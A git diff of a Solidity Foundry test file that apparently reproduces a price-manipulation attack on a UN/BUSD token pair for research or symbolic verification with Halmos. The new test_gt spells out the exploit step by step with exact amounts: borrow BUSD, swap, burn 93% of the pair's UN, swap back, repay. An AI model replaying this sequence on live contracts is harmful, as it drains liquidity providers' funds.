@@ -163,54 +163,29 @@ contract UNTestBase is Test, BlockLoader {
         pair.sync();
     }
 
-    // function test_gt() public {
-    //     vm.startPrank(attacker);
-    //     emit log_named_uint("amt0", 29100 * 1e18);
-    //     borrow_busd_owner(29100 * 1e18);
-    //     printBalance("After step0 ");
-    //     emit log_named_uint("amt1", busd.balanceOf(attacker));
-    //     emit log_named_uint("amt2", 91480714664455701397200);
-    //     swap_pair_attacker_busd_un(
-    //         busd.balanceOf(attacker),
-    //         91480714664455701397200
-    //     );
-    //     printBalance("After step1 ");
-    //     emit log_named_uint("amt3", (un.balanceOf(attacker) * 93) / 100);
-    //     burn_un_pair((un.balanceOf(attacker) * 93) / 100);
-    //     printBalance("After step2 ");
-    //     emit log_named_uint("amt4", un.balanceOf(attacker));
-    //     emit log_named_uint("amt5", 3 * 1e22);
-    //     swap_pair_attacker_un_busd(un.balanceOf(attacker), 3 * 1e22);
-    //     printBalance("After step3 ");
-    //     emit log_named_uint("amt6", (29100 * 1e18 * 1003) / 1000);
-    //     payback_busd_owner((29100 * 1e18 * 1003) / 1000);
-    //     printBalance("After step4 ");
-    //     require(attackGoal(), "Attack failed!");
-    //     vm.stopPrank();
-    // }
-
     function test_gt() public {
-        uint256 amt0 = 0x231b9a323c565a00000;
-        uint256 amt1 = 0x231abc26d11be400000;
-        uint256 amt2 = 0xa124cea331dcc000000;
-        uint256 amt3 = 0x95d8cebdf4fb1000000;
-        uint256 amt4 = 0x919232735ac82000000;
-        uint256 amt5 = 0x23369955a5d1fc00000;
-        uint256 amt6 = 0x233692654a782800000;
         vm.startPrank(attacker);
-        vm.assume(amt6 >= amt0);
-        borrow_busd_owner(amt0);
+        emit log_named_uint("amt0", 29100 * 1e18);
+        borrow_busd_owner(29100 * 1e18);
         printBalance("After step0 ");
-        swap_pair_attacker_busd_un(amt1, amt2);
+        emit log_named_uint("amt1", busd.balanceOf(attacker));
+        emit log_named_uint("amt2", 91480714664455701397200);
+        swap_pair_attacker_busd_un(
+            busd.balanceOf(attacker),
+            91480714664455701397200
+        );
         printBalance("After step1 ");
-        emit log_named_decimal_uint("amt3", amt3, 18);
-        burn_un_pair(amt3);
+        emit log_named_uint("amt3", (un.balanceOf(attacker) * 93) / 100);
+        burn_un_pair((un.balanceOf(attacker) * 93) / 100);
         printBalance("After step2 ");
-        swap_pair_attacker_un_busd(amt4, amt5);
+        emit log_named_uint("amt4", un.balanceOf(attacker));
+        emit log_named_uint("amt5", 3 * 1e22);
+        swap_pair_attacker_un_busd(un.balanceOf(attacker), 3 * 1e22);
         printBalance("After step3 ");
-        payback_busd_owner(amt6);
+        emit log_named_uint("amt6", (29100 * 1e18 * 1003) / 1000);
+        payback_busd_owner((29100 * 1e18 * 1003) / 1000);
         printBalance("After step4 ");
-        require(!attackGoal(), "Attack succeed!");
+        require(attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
 
@@ -230,7 +205,27 @@ contract UNTestBase is Test, BlockLoader {
         burn_un_pair(amt3);
         swap_pair_attacker_un_busd(amt4, amt5);
         payback_busd_owner(amt6);
-        require(!attackGoal(), "Attack succeed!");
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_gt_halmos(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= amt0);
+        borrow_busd_owner(amt0);
+        swap_pair_attacker_busd_un(amt1, amt2);
+        burn_un_pair(amt3);
+        swap_pair_attacker_un_busd(amt4, amt5);
+        payback_busd_owner(amt6);
+        assert(!attackGoal());
         vm.stopPrank();
     }
 }
